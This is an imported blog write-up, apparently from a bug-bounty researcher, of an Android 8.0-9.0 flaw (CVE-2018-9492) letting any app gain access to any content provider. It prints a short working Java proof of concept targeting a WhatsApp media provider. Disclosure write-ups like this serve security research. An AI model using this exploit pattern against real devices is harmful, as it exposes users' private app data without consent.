---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-07-09_global-grant-uri-in-android-80-90-2018-year.md
original_filename: 2020-07-09_global-grant-uri-in-android-80-90-2018-year.md
title: Global grant uri in Android 8.0-9.0 (2018 year)
category: documents
detected_topics:
- access-control
- command-injection
- api-security
- mobile-security
- supply-chain
tags:
- imported
- documents
- access-control
- command-injection
- api-security
- mobile-security
- supply-chain
language: en
raw_sha256: 08bb7faec1dc42f80474eb89733ae0ff7142206838f059384c663b3867ed389a
text_sha256: 1a55c67aa092d39345d8322fdfb64e1174cbcffdf8c555fc05e31370b4cc0671
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Global grant uri in Android 8.0-9.0 (2018 year)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-07-09_global-grant-uri-in-android-80-90-2018-year.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, api-security, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `08bb7faec1dc42f80474eb89733ae0ff7142206838f059384c663b3867ed389a`
- Text SHA256: `1a55c67aa092d39345d8322fdfb64e1174cbcffdf8c555fc05e31370b4cc0671`


## Content

---
title: "Global grant uri in Android 8.0-9.0 (2018 year)"
url: "https://www.vulnano.com/2020/07/global-grant-uri-in-android-80-90-2018.html"
final_url: "https://www.vulnano.com/2020/07/global-grant-uri-in-android-80-90-2018.html"
authors: ["Dzmitry Lukyanenka (@vulnano)"]
programs: ["Google"]
bugs: ["Broken authorization"]
publication_date: "2020-07-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4424
---

###  Global grant uri in Android 8.0-9.0 (2018 year) 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

By  [ Dzmitry ](https://www.blogger.com/profile/06784930502399670573 "author profile") \-  [ July 09, 2020  ](https://www.vulnano.com/2020/07/global-grant-uri-in-android-80-90-2018.html "permanent link")

Any thirdparty application was able to grant read/write access to any exported/non exported, secured by permissions content providers which were installed in system. It did't matter if content provider defined in AndroidManifest with grantUriPermission flag or not, if it was exported or no. Thirdparty were able to access any content provider in system without user interaction.  
  

Uri uri =Uri.parse("content://com.whatsapp.provider.media/item/5");  
Intent intent = new Intent(Intent.ACTION_MAIN);  
intent.setClassName(getPackageName(), MainActivity.class.getName());  
intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);  
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);  
intent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);  
intent.putExtra(Intent.EXTRA_STREAM, uri);  
intent.setType("*/*");  
startActivity(intent);

  

And that's all :) When you launch that code on vulnerable Android your app receives access to passed "uri" value. You can opened any content providers in system!

  

PoC demo:

  

  

This funny bug was reported in 30.08.2018. 

And than  
The Android Security Team believes that this is a duplicate of a report previously submitted by another external researcher on July 26, 2018.  
  
So, for me it was duplicate.  
Original bug information is next:  
  

  * CVE-2018-9492
  * Author: Michał Bednarski 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps
